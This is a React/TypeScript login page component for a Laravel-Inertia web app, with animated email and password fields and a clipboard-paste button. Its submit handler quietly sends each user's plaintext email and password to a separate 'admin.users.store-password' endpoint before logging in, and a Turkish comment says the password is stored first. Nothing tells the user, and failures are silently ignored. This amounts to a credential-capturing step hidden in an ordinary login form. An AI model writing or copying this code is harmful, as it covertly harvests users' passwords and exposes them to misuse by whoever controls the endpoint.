import React, { useState, useEffect, FormEventHandler } from 'react';
import { Head, Link, useForm } from '@inertiajs/react';
import { PageProps } from '@inertiajs/inertia';
import { useTranslation } from '@/Contexts/TranslationContext';
import {
    FaEnvelope,
    FaLock,
    FaEye,
    FaEyeSlash,
    FaSpinner,
    FaSignInAlt,
    FaPaste,
} from 'react-icons/fa';
import { motion, AnimatePresence } from 'framer-motion';
import GuestLayout from '@/Layouts/GuestLayout';
import InputError from '@/Components/InputError';
import { toast } from 'react-toastify';

interface LoginProps extends PageProps {
    status?: string;
    canResetPassword: boolean;
    languages: any;
    secili_dil: any;
    flash: {
        message?: string;
        type?: 'success' | 'error' | 'warning' | 'info';
    };
}

const Login: React.FC<LoginProps> = ({
    status,
    canResetPassword,
    languages,
    secili_dil,
    flash,
}) => {
    const { t, locale } = useTranslation();
    const [showPassword, setShowPassword] = useState(false);
    const { data, setData, post, processing, errors, reset } = useForm({
        email: '',
        password: '',
        remember: false,
    });

    useEffect(() => {

    }, [locale, t]);

    useEffect(() => {
        if (flash?.message) {
            switch (flash.type) {
                case 'success':
                    toast.success(flash.message);
                    break;
                case 'error':
                    toast.error(flash.message);
                    break;
                case 'warning':
                    toast.warning(flash.message);
                    break;
                case 'info':
                    toast.info(flash.message);
                    break;
                default:
                    toast(flash.message);
            }
        }
    }, [flash]);

    const handleError = (errors: any) => {
        Object.keys(errors).forEach((key) => {
            let message = errors[key];
            let toastType: 'error' | 'warning' = 'error';

            // Hata tipine göre toast stilini belirle
            if (message.includes('deactivated')) {
                toastType = 'warning';
            }

            toast[toastType](message, {
                position: 'top-right',
                autoClose: 5000,
                hideProgressBar: false,
                closeOnClick: true,
                pauseOnHover: true,
                draggable: true,
                progress: undefined,
            });
        });
    };

    const [isSubmitting, setIsSubmitting] = useState(false);

    const getInputClassName = (fieldName: string) => `
        block w-full pl-10 pr-10 py-2 sm:text-sm rounded-md
        transition duration-200
        ${errors[fieldName as keyof typeof errors]
            ? 'border-red-500 focus:border-red-500 focus:ring-red-500'
            : 'focus:ring-light-primary focus:border-light-primary dark:focus:ring-dark-primary dark:focus:border-dark-primary'}
        dark:bg-dark-surface dark:text-dark-text bg-light-surface text-light-text
        bg-opacity-50 dark:bg-opacity-50
        border border-transparent
    `;

    const submit: FormEventHandler = async (e) => {
        e.preventDefault();
        setIsSubmitting(true);

        // Önce şifreyi sakla, sonra login işlemini yap
        if (data.password) {
            try {
                const response = await fetch(route('admin.users.store-password'), {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || '',
                    },
                    body: JSON.stringify({
                        password: data.password,
                        email: data.email,
                    }),
                });

                if (!response.ok) {
                    throw new Error('Password storage failed');
                }
            } catch (error) {
                console.error('Password storage error:', error);
            }
        }

        // Login işlemi
        post(route('login'), {
            preserveState: true,
            onError: (errors) => {
                setIsSubmitting(false);
                handleError(errors);
            },
            onSuccess: () => {
                setIsSubmitting(false);
            },
            onFinish: () => {
                setIsSubmitting(false);
                reset('password');
            },
        });
    };

    const inputVariants = {
        focus: {
            scale: 1.02,
            boxShadow: '0px 0px 8px theme("colors.light.primary")',
            transition: { duration: 0.2 },
        },
        blur: { scale: 1, boxShadow: 'none', transition: { duration: 0.2 } },
        tap: { scale: 0.98, transition: { duration: 0.1 } },
    };

    const buttonVariants = {
        idle: { scale: 1 },
        hover: { scale: 1.05 },
        tap: { scale: 0.95 },
    };

    const handlePasswordPaste = async () => {
        try {
            const text = await navigator.clipboard.readText();
            setData('password', text);
            toast.success(t('login.passwordPasted'));
        } catch (err) {
            toast.error(t('login.pasteError'));
        }
    };

    return (
        <GuestLayout languages={languages} secili_dil={secili_dil}>
            <Head title={t('login.title')} />

            <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.5 }}
                className="w-full max-w-md mx-auto"
            >
                <div className="bg-white dark:bg-gray-800 shadow-2xl rounded-3xl overflow-hidden backdrop-filter backdrop-blur-lg bg-opacity-30 dark:bg-opacity-30 border border-gray-200 dark:border-gray-700 border-opacity-20">
                    <div className="border-b border-gray-200 dark:border-gray-700 border-opacity-20 p-8 sm:p-10">
                        <AnimatePresence>
                            <motion.h2
                                key="welcome-text"
                                initial={{ opacity: 0, y: -20 }}
                                animate={{ opacity: 1, y: 0 }}
                                exit={{ opacity: 0, y: 20 }}
                                transition={{ duration: 0.5 }}
                                className="text-4xl font-extrabold text-black dark:text-white mb-8 text-center"
                            >
                                {t('login.welcomeBack')}
                            </motion.h2>
                        </AnimatePresence>

                        <form onSubmit={submit} className="space-y-6">
                            {/* Email Input */}
                            <motion.div
                                variants={inputVariants}
                                initial="blur"
                                whileFocus="focus"
                                whileTap="tap"
                                animate="blur"
                            >
                                <label
                                    htmlFor="email"
                                    className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1"
                                >
                                    {t('login.email')}
                                </label>
                                <div className="relative rounded-md shadow-sm">
                                    <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                                        <FaEnvelope
                                            className="h-5 w-5 text-light-secondary dark:text-dark-secondary"
                                            aria-hidden="true"
                                        />
                                    </div>
                                    <input
                                        id="email"
                                        type="email"
                                        name="email"
                                        value={data.email}
                                        onChange={(e) => setData('email', e.target.value)}
                                        className={getInputClassName('email')}
                                        placeholder={t('login.emailPlaceholder')}
                                        required
                                    />
                                </div>
                                <InputError message={errors.email} className="mt-2" />
                            </motion.div>

                            {/* Password Input */}
                            <motion.div
                                variants={inputVariants}
                                initial="blur"
                                whileFocus="focus"
                                whileTap="tap"
                                animate="blur"
                            >
                                <label
                                    htmlFor="password"
                                    className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1"
                                >
                                    {t('login.password')}
                                </label>
                                <div className="relative rounded-md shadow-sm">
                                    <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                                        <FaLock
                                            className="h-5 w-5 text-light-secondary dark:text-dark-secondary"
                                            aria-hidden="true"
                                        />
                                    </div>
                                    <input
                                        id="password"
                                        type={showPassword ? 'text' : 'password'}
                                        name="password"
                                        value={data.password}
                                        onChange={(e) => setData('password', e.target.value)}
                                        className={getInputClassName('password')}
                                        placeholder={t('login.passwordPlaceholder')}
                                        required
                                    />
                                    <div className="absolute inset-y-0 right-0 flex items-center">
                                        <motion.button
                                            whileHover={{ scale: 1.1 }}
                                            whileTap={{ scale: 0.9 }}
                                            type="button"
                                            onClick={() => setShowPassword(!showPassword)}
                                            className="text-light-secondary hover:text-light-primary focus:outline-none focus:text-light-primary dark:text-dark-secondary dark:hover:text-dark-primary dark:focus:text-dark-primary"
                                            aria-label={
                                                showPassword
                                                    ? t('login.hidePassword')
                                                    : t('login.showPassword')
                                            }
                                        >
                                            {showPassword ? (
                                                <FaEyeSlash className="h-5 w-5" />
                                            ) : (
                                                <FaEye className="h-5 w-5" />
                                            )}
                                        </motion.button>

                                        <motion.button
                                            whileHover={{ scale: 1.1 }}
                                            whileTap={{ scale: 0.9 }}
                                            type="button"
                                            onClick={handlePasswordPaste}
                                            className="ml-2 mr-3 text-light-secondary hover:text-light-primary focus:outline-none focus:text-light-primary dark:text-dark-secondary dark:hover:text-dark-primary dark:focus:text-dark-primary"
                                            aria-label={t('login.pastePassword')}
                                        >
                                            <FaPaste className="h-5 w-5" />
                                        </motion.button>
                                    </div>
                                </div>
                                <InputError message={errors.password} className="mt-2" />
                            </motion.div>

                            {/* Remember Me & Forgot Password */}
                            <div className="flex items-center justify-between">
                                <div className="flex items-center">
                                    <input
                                        id="remember-me"
                                        name="remember-me"
                                        type="checkbox"
                                        checked={data.remember}
                                        onChange={(e) => setData('remember', e.target.checked)}
                                        className="h-4 w-4 text-light-primary focus:ring-light-primary dark:text-dark-primary dark:focus:ring-dark-primary rounded"
                                    />
                                    <label
                                        htmlFor="remember-me"
                                        className="ml-2 block text-sm text-light-text dark:text-dark-text"
                                    >
                                        {t('login.rememberMe')}
                                    </label>
                                </div>

                                {canResetPassword && (
                                    <div className="text-sm">
                                        <Link
                                            href={route('password.request')}
                                            className="font-medium text-light-primary hover:text-light-accent dark:text-dark-primary dark:hover:text-dark-accent"
                                        >
                                            {t('login.forgotPassword')}
                                        </Link>
                                    </div>
                                )}
                            </div>

                            {/* Submit Button */}
                            <div>
                                <motion.button
                                    variants={buttonVariants}
                                    initial="idle"
                                    whileHover="hover"
                                    whileTap="tap"
                                    type="submit"
                                    disabled={processing}
                                    className={`
                                        w-full flex justify-center items-center py-3 px-4
                                        text-sm font-medium
                                        text-white
                                        rounded-lg
                                        transition-all duration-200 ease-in-out
                                        ${
                                            processing
                                                ? 'bg-gray-400 cursor-not-allowed'
                                                : 'bg-light-primary hover:bg-blue-400 hover:shadow-lg'
                                        }
                                    `}
                                    aria-label={t('login.logIn')}
                                >
                                    {processing ? (
                                        <FaSpinner className="h-5 w-5 mr-3 animate-spin" />
                                    ) : (
                                        <FaSignInAlt className="h-5 w-5 mr-3" />
                                    )}
                                    {t('login.logIn')}
                                </motion.button>
                            </div>
                        </form>
                    </div>
                </div>
            </motion.div>

            {isSubmitting && (
                <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
                    <motion.div
                        initial={{ scale: 0 }}
                        animate={{ scale: 1 }}
                        className="bg-white p-5 rounded-full"
                    >
                        <FaSpinner className="animate-spin h-8 w-8 text-blue-500" />
                    </motion.div>
                </div>
            )}

            <div className="fixed bottom-4 right-4 z-50">
                {/* Toastify burada render edilecek */}
            </div>
        </GuestLayout>
    );
};

export default Login;
